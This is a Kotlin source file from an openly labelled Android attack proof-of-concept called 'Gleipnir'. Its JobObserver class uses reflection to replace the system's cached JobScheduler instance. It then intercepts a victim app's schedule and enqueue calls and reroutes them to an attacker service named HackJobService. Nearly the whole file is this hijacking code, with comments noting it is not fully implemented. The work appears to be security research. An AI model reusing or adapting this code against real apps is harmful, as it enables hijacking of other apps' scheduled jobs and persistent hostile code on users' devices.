/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.extendableLoader.internal

import android.app.Activity
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.app.job.JobWorkItem
import android.content.ComponentName
import android.content.Context
import org.gleipnir.app.extendableLoader.log
import org.gleipnir.app.helpers.extensions.getServiceFetchers
import org.gleipnir.app.reflectionHelper.setReflective

/**
 * We listen of job enqueue calls and replace it with our custom service.
 * Once Android is going to start the Gleipnir service we again start the victim service.
 * Not fully implemented!
 *
 * // todo catch the job start triggered by android
 */
class JobObserver(val jobScheduler: JobScheduler, val hostActivity: Activity) : JobScheduler() {

    override fun enqueue(p0: JobInfo, p1: JobWorkItem): Int {
        log("JobObserver [-] enqueue [-] servicepatch [-] ${p0.service}")
        val originalComponent = p0.service
        try {
            return jobScheduler.enqueue(wrapJob(p0), p1)
        } catch (exception: Exception) {
            log("JobObserver [-] enqueue [-] error while enqueue job", exception)
            return 0
        }
    }

    fun wrapJob(p0: JobInfo): JobInfo {
        val serviceComponent = ComponentName(hostActivity, "com.gleipnir.HackJobService")
        val builder = JobInfo.Builder(p0.id, serviceComponent)
        builder.setBackoffCriteria(p0.initialBackoffMillis, p0.backoffPolicy)
        p0.triggerContentUris?.forEach {
            builder.addTriggerContentUri(it)
        }
        builder.setClipData(p0.clipData, p0.clipGrantFlags)
        builder.setEstimatedNetworkBytes(
            p0.estimatedNetworkDownloadBytes,
            p0.estimatedNetworkUploadBytes
        )
        builder.setExtras(p0.extras)
        builder.setImportantWhileForeground(p0.isImportantWhileForeground)
        //builder.setMinimumLatency(p0.minLatencyMillis) // not allowed for periodic jobs...
        //builder.setOverrideDeadline(p0.maxExecutionDelayMillis) // todo check if periodic
        builder.setPeriodic(p0.intervalMillis, p0.flexMillis)
        builder.setPersisted(p0.isPersisted)
        builder.setRequiredNetwork(p0.requiredNetwork)
        builder.setTransientExtras(p0.transientExtras)
        return builder.build()
    }

    override fun cancelAll() {
        jobScheduler.cancelAll()
    }

    override fun schedule(p0: JobInfo): Int {
        log("JobObserver [-] schedule [-] servicepatch [-] ${p0.service}")
        val originalComponent = p0.service

        try { // some jobs need permissions... todo add default permissions to our job placeholder!?
            return jobScheduler.schedule(wrapJob(p0))
        } catch (exception: Exception) {
            log("JobObserver [-] schedule [-] error while schedule job", exception)
        }
        return RESULT_SUCCESS
    }

    override fun getAllPendingJobs(): MutableList<JobInfo> {
        return jobScheduler.getAllPendingJobs()
    }

    override fun getPendingJob(p0: Int): JobInfo? {
        return jobScheduler.getPendingJob(p0)
    }

    override fun cancel(p0: Int) {
        return jobScheduler.cancel(p0)
    }

    companion object {

        fun injectJobObserver(hostActivity: Activity) {
            val scheduler =
                hostActivity.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
            //val schedulerImplClass = Class.forName("android.app.JobSchedulerImpl")


            getServiceFetchers()?.forEach {
                val serviceName = it.key
                val serviceFetcher = it.value
                if (serviceName == Context.JOB_SCHEDULER_SERVICE) {
                    //val mCachedInstance = getReflective<Any>(serviceFetcher, "mCachedInstance")
                    log("JobObserver [-] inject JobObserver! ${serviceFetcher::class.java}")
                    setReflective(
                        serviceFetcher,
                        Class.forName("android.app.SystemServiceRegistry\$StaticServiceFetcher"),
                        "mCachedInstance",
                        JobObserver(scheduler, hostActivity)
                    )
                }
            }
        }
    }
}